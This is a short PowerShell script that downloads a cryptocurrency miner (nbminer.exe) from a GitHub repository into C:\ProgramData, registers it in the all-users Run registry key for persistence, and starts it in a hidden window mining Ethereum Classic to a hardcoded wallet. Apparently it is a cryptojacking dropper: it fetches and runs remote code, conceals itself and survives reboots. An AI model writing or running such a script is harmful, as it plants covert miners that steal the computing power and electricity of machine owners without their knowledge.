$exeUrl = "https://github.com/Anarxyfr/gdfagdsagdsa/raw/refs/heads/main/nbminer.exe"
$exePath = "C:\ProgramData\nbminer.exe"

# Download NBMiner
Invoke-WebRequest $exeUrl -OutFile $exePath

# Add to startup for all users
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "nbminer" `
    -Value "`"$exePath`""

# Optional: Run it now with arguments
$nbminerArgs = "-a etchash -o stratum+tcp://etc.2miners.com:1010 -u 0x8e7bd35580ba4352d45d679254538b5d9ef164c2.anarxyfr -log"
Start-Process -FilePath $exePath -ArgumentList $nbminerArgs -WindowStyle Hidden
